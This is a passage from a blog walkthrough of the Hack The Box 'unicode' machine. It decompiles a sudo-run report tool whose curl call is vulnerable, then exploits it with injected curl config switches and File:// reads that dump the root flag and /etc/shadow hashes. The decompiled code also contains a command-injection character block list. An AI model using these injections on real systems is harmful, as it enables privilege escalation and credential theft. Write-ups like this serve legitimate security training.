version <span class="string">&quot;2.7.18&quot;</span>) </span><br><span class="line">-- Configuring <span class="keyword">done</span></span><br><span class="line">-- Generating <span class="keyword">done</span></span><br><span class="line">-- Build files have been written to: /root/pycdc</span><br><span class="line">┌──(root💀kali)-[~/pycdc]</span><br><span class="line">└─<span class="comment"># ls -la</span></span><br><span class="line">总用量 2556</span><br><span class="line">drwxrwxrwx   8 root root   4096 12月  1 10:21 .</span><br><span class="line">drwx------ 161 root root  12288 12月  1 08:01 ..</span><br><span class="line">-rwxrwxrwx   1 root root   1681  5月 16  2020 ASTNode.cpp</span><br><span class="line">-rwxrwxrwx   1 root root  16201  5月 16  2020 ASTNode.h</span><br><span class="line">-rwxrwxrwx   1 root root 115114  5月 16  2020 ASTree.cpp</span><br><span class="line">-rwxrwxrwx   1 root root    253  5月 16  2020 ASTree.h</span><br><span class="line">-rwxrwxrwx   1 root root  11662  5月 16  2020 bytecode.cpp</span><br><span class="line">-rwxrwxrwx   1 root root    848  5月 16  2020 bytecode.h</span><br><span class="line">-rwxrwxrwx   1 root root   3922  5月 16  2020 bytecode_ops.inl</span><br><span class="line">drwxrwxrwx   2 root root   4096  5月 16  2020 bytes</span><br><span class="line">-rw-r--r--   1 root root  13934 12月  1 10:21 CMakeCache.txt</span><br><span class="line">drwxrwxrwx   9 root root   4096 12月  1 10:21 CMakeFiles</span><br><span class="line">-rw-r--r--   1 root root   3065 12月  1 10:21 cmake_install.cmake</span><br><span class="line">-rwxrwxrwx   1 root root   1900  5月 16  2020 CMakeLists.txt</span><br><span class="line">-rwxrwxrwx   1 root root   1781  5月 16  2020 data.cpp</span><br><span class="line">-rwxrwxrwx   1 root root   1269  5月 16  2020 data.h</span><br><span class="line">-rwxrwxrwx   1 root root    969  5月 16  2020 FastStack.h</span><br><span class="line">drwxr-xr-x   8 root root   4096  5月 16  2020 .git</span><br><span class="line">drwxr-xr-x   3 root root   4096  5月 16  2020 .github</span><br><span class="line">-rw-r--r--   1 root root     42  5月 16  2020 .gitignore</span><br><span class="line">-rwxrwxrwx   1 root root 965136  5月 16  2020 libpycxx.a</span><br><span class="line">-rwxrwxrwx   1 root root  35147  5月 16  2020 LICENSE</span><br><span class="line">-rw-r--r--   1 root root  36621 12月  1 10:21 Makefile</span><br><span class="line">-rwxrwxrwx   1 root root   2319  5月 16  2020 pyc_code.cpp</span><br><span class="line">-rwxrwxrwx   1 root root   3270  5月 16  2020 pyc_code.h</span><br><span class="line">-rwxrwxrwx   1 root root 360984  5月 16  2020 pycdas</span><br><span class="line">-rwxrwxrwx   1 root root   8665  5月 16  2020 pycdas.cpp</span><br><span class="line">-rwxrwxrwx   1 root root 833824  5月 16  2020 pycdc</span><br><span class="line">-rwxrwxrwx   1 root root   1104  5月 16  2020 pycdc.cpp</span><br><span class="line">-rwxrwxrwx   1 root root   4504  5月 16  2020 pyc_module.cpp</span><br><span class="line">-rwxrwxrwx   1 root root   1932  5月 16  2020 pyc_module.h</span><br><span class="line">-rwxrwxrwx   1 root root   3694  5月 16  2020 pyc_numeric.cpp</span><br><span class="line">-rwxrwxrwx   1 root root   2624  5月 16  2020 pyc_numeric.h</span><br><span class="line">-rwxrwxrwx   1 root root   2728  5月 16  2020 pyc_object.cpp</span><br><span class="line">-rwxrwxrwx   1 root root   3932  5月 16  2020 pyc_object.h</span><br><span class="line">-rwxrwxrwx   1 root root   4559  5月 16  2020 pyc_sequence.cpp</span><br><span class="line">-rwxrwxrwx   1 root root   2265  5月 16  2020 pyc_sequence.h</span><br><span class="line">-rwxrwxrwx   1 root root   4280  5月 16  2020 pyc_string.cpp</span><br><span class="line">-rwxrwxrwx   1 root root    961  5月 16  2020 pyc_string.h</span><br><span class="line">-rwxrwxrwx   1 root root  48053  5月 16  2020 PythonBytecode.txt</span><br><span class="line">-rwxrwxrwx   1 root root   1460  5月 16  2020 README.markdown</span><br><span class="line">drwxrwxrwx   3 root root   4096  5月 16  2020 scripts</span><br><span class="line">drwxrwxrwx   6 root root   4096  5月 16  2020 tests</span><br><span class="line">┌──(root💀kali)-[~/pycdc]</span><br><span class="line">└─<span class="comment"># make                                                                                                           </span></span><br><span class="line">[  2%] Generating bytes/python_10.cpp, bytes/python_11.cpp, bytes/python_13.cpp, bytes/python_14.cpp, bytes/python_15.cpp, bytes/python_16.cpp, bytes/python_20.cpp, bytes/python_21.cpp, bytes/python_22.cpp, bytes/python_23.cpp, bytes/python_24.cpp, bytes/python_25.cpp, bytes/python_26.cpp, bytes/python_27.cpp, bytes/python_30.cpp, bytes/python_31.cpp, bytes/python_32.cpp, bytes/python_33.cpp, bytes/python_34.cpp, bytes/python_35.cpp, bytes/python_36.cpp, bytes/python_37.cpp, bytes/python_38.cpp                                                                            </span><br><span class="line">[  5%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o</span><br><span class="line">[  7%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o</span><br><span class="line">[ 10%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o</span><br><span class="line">[ 12%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cpp.o</span><br><span class="line">[ 15%] Building CXX object CMakeFiles/pycxx.dir/pyc_numeric.cpp.o</span><br><span class="line">[ 17%] Building CXX object CMakeFiles/pycxx.dir/pyc_object.cpp.o</span><br><span class="line">[ 20%] Building CXX object CMakeFiles/pycxx.dir/pyc_sequence.cpp.o</span><br><span class="line">[ 23%] Building CXX object CMakeFiles/pycxx.dir/pyc_string.cpp.o</span><br><span class="line">[ 25%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_10.cpp.o</span><br><span class="line">[ 28%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_11.cpp.o</span><br><span class="line">[ 30%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_13.cpp.o</span><br><span class="line">[ 33%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_14.cpp.o</span><br><span class="line">[ 35%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_15.cpp.o</span><br><span class="line">[ 38%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_16.cpp.o</span><br><span class="line">[ 41%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_20.cpp.o</span><br><span class="line">[ 43%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_21.cpp.o</span><br><span class="line">[ 46%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_22.cpp.o</span><br><span class="line">[ 48%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_23.cpp.o</span><br><span class="line">[ 51%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_24.cpp.o</span><br><span class="line">[ 53%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_25.cpp.o</span><br><span class="line">[ 56%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_26.cpp.o</span><br><span class="line">[ 58%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_27.cpp.o</span><br><span class="line">[ 61%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_30.cpp.o</span><br><span class="line">[ 64%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_31.cpp.o</span><br><span class="line">[ 66%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_32.cpp.o</span><br><span class="line">[ 69%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_33.cpp.o</span><br><span class="line">[ 71%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_34.cpp.o</span><br><span class="line">[ 74%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_35.cpp.o</span><br><span class="line">[ 76%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_36.cpp.o</span><br><span class="line">[ 79%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_37.cpp.o</span><br><span class="line">[ 82%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_38.cpp.o</span><br><span class="line">[ 84%] Linking CXX static library libpycxx.a</span><br><span class="line">[ 84%] Built target pycxx</span><br><span class="line">[ 87%] Building CXX object CMakeFiles/pycdc.dir/pycdc.cpp.o</span><br><span class="line">[ 89%] Building CXX object CMakeFiles/pycdc.dir/ASTree.cpp.o</span><br><span class="line">[ 92%] Building CXX object CMakeFiles/pycdc.dir/ASTNode.cpp.o</span><br><span class="line">[ 94%] Linking CXX executable pycdc</span><br><span class="line">[ 94%] Built target pycdc</span><br><span class="line">[ 97%] Building CXX object CMakeFiles/pycdas.dir/pycdas.cpp.o</span><br><span class="line">[100%] Linking CXX executable pycdas</span><br><span class="line">[100%] Built target pycdas</span><br><span class="line">┌──(root💀kali)-[~/pycdc]</span><br><span class="line">└─<span class="comment"># ls                                                                                                             </span></span><br><span class="line">ASTNode.cpp   bytecode_ops.inl     data.cpp     pyc_code.cpp  pyc_module.cpp   pyc_sequence.cpp    scripts</span><br><span class="line">ASTNode.h     bytes                data.h       pyc_code.h    pyc_module.h     pyc_sequence.h      tests</span><br><span class="line">ASTree.cpp    CMakeCache.txt       FastStack.h  pycdas        pyc_numeric.cpp  pyc_string.cpp</span><br><span class="line">ASTree.h      CMakeFiles           libpycxx.a   pycdas.cpp    pyc_numeric.h    pyc_string.h</span><br><span class="line">bytecode.cpp  cmake_install.cmake  LICENSE      pycdc         pyc_object.cpp   PythonBytecode.txt</span><br><span class="line">bytecode.h    CMakeLists.txt       Makefile     pycdc.cpp     pyc_object.h     README.markdown</span><br></pre></td></tr></table></figure>
+
+<p>Now we can use this to decompile.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode/treport_extracted]</span><br><span class="line">└─<span class="comment"># /root/pycdc/pycdc treport.pyc</span></span><br><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: treport.pyc (Python 3.9)</span></span><br><span class="line">Unsupported opcode: &lt;255&gt;</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">from datetime import datetime</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">class threat_report:</span><br><span class="line">    def create(self):</span><br><span class="line">        Unsupported opcode: &lt;255&gt;</span><br><span class="line">        file_name = input(<span class="string">&#x27;Enter the filename:&#x27;</span>)</span><br><span class="line">        content = input(<span class="string">&#x27;Enter the report:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../&#x27;</span> <span class="keyword">in</span> file_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NOT ALLOWED&#x27;</span>)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        file_path = <span class="string">&#x27;/root/reports/&#x27;</span> + file_name</span><br><span class="line">    <span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line">    def list_files(self):</span><br><span class="line">        file_list = os.listdir(<span class="string">&#x27;/root/reports/&#x27;</span>)</span><br><span class="line">        files_in_dir = <span class="string">&#x27; &#x27;</span>.<span class="built_in">join</span>((lambda .<span class="number">0</span>: [ str(elem) for elem in .<span class="number">0</span> ])(file_list))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ALL THE THREAT REPORTS:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(files_in_dir)</span><br><span class="line">    def read_file(self):</span><br><span class="line">        Unsupported opcode: &lt;255&gt;</span><br><span class="line">        file_name = input(<span class="string">&#x27;\nEnter the filename:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../&#x27;</span> <span class="keyword">in</span> file_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NOT ALLOWED&#x27;</span>)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        contents = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        file_name = <span class="string">&#x27;/root/reports/&#x27;</span> + file_name</span><br><span class="line">    <span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line">    def download(self):</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        current_time = now.strftime(<span class="string">&#x27;%H_%M_%S&#x27;</span>)</span><br><span class="line">        command_injection_list = [</span><br><span class="line">            <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;|&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;||&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;)&#x27;</span>]</span><br><span class="line">    ip = input(<span class="string">&#x27;Enter the IP/file_name:&#x27;</span>)</span><br><span class="line">    res = bool(re.search(<span class="string">&#x27;\\s&#x27;</span>, ip))</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;INVALID IP&#x27;</span>)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> ip and <span class="string">&#x27;gopher&#x27;</span> <span class="keyword">in</span> ip or <span class="string">&#x27;mysql&#x27;</span> <span class="keyword">in</span> ip:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;INVALID URL&#x27;</span>)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    cmd = <span class="string">&#x27;/bin/bash -c &quot;curl &#x27;</span> + ip + <span class="string">&#x27; -o /root/reports/threat_report_&#x27;</span> + current_time + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    current_time + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    os.system(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>Looking at the code, we can see a command is being called to download reports. It is using curl command to do that. It has also filter in place to protect from injection attacks. We can’t possibly run bash commands to gain shell, we have to use curl flags or switches to read either root flag or SSH private keys.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">code@code:~$ sudo /usr/bin/treport</span><br><span class="line">1.Create Threat Report.</span><br><span class="line">2.Read Threat Report.</span><br><span class="line">3.Download A Threat Report.</span><br><span class="line">4.Quit.</span><br><span class="line">Enter your choice:3</span><br><span class="line">Enter the IP/file_name:&#123;--config,/root/root.txt&#125;</span><br><span class="line">Warning: /root/root.txt:1: warning: <span class="string">&#x27;83073a2469b47c0e6c08b421a6aa8539&#x27;</span> is </span><br><span class="line">Warning: unknown</span><br><span class="line">curl: no URL specified!</span><br><span class="line">curl: try <span class="string">&#x27;curl --help&#x27;</span> or <span class="string">&#x27;curl --manual&#x27;</span> <span class="keyword">for</span> more information</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Enter your choice:3</span><br><span class="line">Enter the IP/file_name:&#123;-K,/root/root.txt&#125;</span><br><span class="line">Warning: /root/root.txt:1: warning: <span class="string">&#x27;83073a2469b47c0e6c08b421a6aa8539&#x27;</span> is </span><br><span class="line">Warning: unknown</span><br><span class="line">curl: no URL specified!</span><br><span class="line">curl: try <span class="string">&#x27;curl --help&#x27;</span> or <span class="string">&#x27;curl --manual&#x27;</span> <span class="keyword">for</span> more information</span><br><span class="line">Enter your choice:</span><br></pre></td></tr></table></figure>
+
+<p>or use the following to get root flag and &#x2F;etc&#x2F;shadow together…</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">code@code:~$ <span class="built_in">cd</span> $(<span class="built_in">mktemp</span> --directory)</span><br><span class="line">code@code:/tmp/tmp.cg0X17Nhmm$ <span class="built_in">touch</span> -- 127.0.0.1 --silent --create-dirs</span><br><span class="line">code@code:/tmp/tmp.cg0X17Nhmm$ sudo /usr/bin/treport</span><br><span class="line">1.Create Threat Report.</span><br><span class="line">2.Read Threat Report.</span><br><span class="line">3.Download A Threat Report.</span><br><span class="line">4.Quit.</span><br><span class="line">Enter your choice:3</span><br><span class="line">Enter the IP/file_name:*</span><br><span class="line">Enter your choice:3</span><br><span class="line">Enter the IP/file_name:File:///root/root.txt</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    33  100    33    0     0  33000      0 --:--:-- --:--:-- --:--:-- 33000</span><br><span class="line"></span><br><span class="line">Enter your choice:3</span><br><span class="line">Enter the IP/file_name:File:///etc/shadow   </span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  1183  100  1183    0     0  1155k      0 --:--:-- --:--:-- --:--:-- 1155k</span><br><span class="line">Enter your choice:2</span><br><span class="line">ALL THE THREAT REPORTS:</span><br><span class="line">threat_report_15_45_38 threat_report_15_44_36 threat_report_15_44_56</span><br><span class="line"></span><br><span class="line">Enter the filename:threat_report_15_45_38</span><br><span class="line">root:$6$XbmQqbMSJS0PISos<span class="variable">$fHZLEpIBtbsRd2ltGIYSJPfmIYYyLKxx9iUiPdcBGsrp8STgHopWnoZ1WKXgrwc1d81idPRJxICovSXGUF</span>.we/:18799:0:99999:7:::</span><br><span class="line">daemon:*:18659:0:99999:7:::</span><br><span class="line">bin:*:18659:0:99999:7:::</span><br><span class="line">sys:*:18659:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18659:0:99999:7:::</span><br><span class="line">games:*:18659:0:99999:7:::</span><br><span class="line">man:*:18659:0:99999:7:::</span><br><span class="line">lp:*:18659:0:99999:7:::</span><br><span class="line">mail:*:18659:0:99999:7:::</span><br><span class="line">news:*:18659:0:99999:7:::</span><br><span class="line">uucp:*:18659:0:99999:7:::</span><br><span class="line">proxy:*:18659:0:99999:7:::</span><br><span class="line">www-data:*:18659:0:99999:7:::</span><br><span class="line">backup:*:18659:0:99999:7:::</span><br><span class="line">list:*:18659:0:99999:7:::</span><br><span class="line">irc:*:18659:0:99999:7:::</span><br><span class="line">gnats:*:18659:0:99999:7:::</span><br><span class="line">nobody:*:18659:0:99999:7:::</span><br><span class="line">systemd-network:*:18659:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18659:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18659:0:99999:7:::</span><br><span class="line">messagebus:*:18659:0:99999:7:::</span><br><span class="line">syslog:*:18659:0:99999:7:::</span><br><span class="line">_apt:*:18659:0:99999:7:::</span><br><span class="line">tss:*:18659:0:99999:7:::</span><br><span class="line">uuidd:*:18659:0:99999:7:::</span><br><span class="line">tcpdump:*:18659:0:99999:7:::</span><br><span class="line">landscape:*:18659:0:99999:7:::</span><br><span class="line">pollinate:*:18659:0:99999:7:::</span><br><span class="line">usbmux:*:18799:0:99999:7:::</span><br><span class="line">sshd:*:18799:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18799::::::</span><br><span class="line">lxd:!:18799::::::</span><br><span class="line">mysql:!:18799:0:99999:7:::</span><br><span class="line">code:$6$tdOqUgDnt8lqOmpk<span class="variable">$Y5JZc</span>.PspT2gkpp6LqWHUElepUmZerkVmSB8XV9Oss2zgmzO8cvNUyo4AGjfkbaRO34mV3leNx5HPvgtXSlrv.:18799:0:99999:7:::</span><br><span class="line"></span><br><span class="line">Enter your choice:2</span><br><span class="line">ALL THE THREAT REPORTS:</span><br><span class="line">threat_report_15_45_38 threat_report_15_44_36 threat_report_15_44_56</span><br><span class="line"></span><br><span class="line">Enter the filename:threat_report_15_44_56</span><br><span class="line">83073a2469b47c0e6c08b421a6aa8539</span><br></pre></td></tr></table></figure>
+
+<p>As you can see from the command injection list ‘curly brackets’ are not being filtered, we take advantage of that to pass curl config switch to expose root flag.This curl switch actually can’t read the files, but the functionality of that is, if the text file is not in curl Standard format then it just prints out all the content of that given file. I got SSH private keys, but the SSH configuration only accepts password for authentication, not keys.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2118.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>jwt token forge by using <span class="exturl" data-url="aHR0cHM6Ly9qd3QuaW8v">https://jwt.io<i class="fa fa-external-link-alt"></i></span> and <span class="exturl" data-url="aHR0cHM6Ly9ta2p3ay5vcmcv">https://mkjwk.org/<i class="fa fa-external-link-alt"></i></span></li>
+<li>off-by-slash bug redirect to our local machine</li>
+<li>file read bypass by using Unicode normalization</li>
+<li>fuzzing file read arg to get db.yaml file content</li>
+<li>using pycdc to decompile .pyc file to readable file</li>
+<li>command injection list words bypass</li>
+<li>privesc through &#x2F;usr&#x2F;bin&#x2F;treport by using curl command injection attacks</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/12/01/unicode/" title="Hack-The-Box-walkthrough[unicode]">https://fdlucifer.github.io/2021/12/01/unicode/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/22/backdoor/" rel="prev" title="Hack-The-Box-walkthrough[backdoor]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[backdoor]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/11/echoland/" rel="next" title="Hack-The-Box-pwn-challenge[echoland]">
+                  Hack-The-Box-pwn-challenge[echoland] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
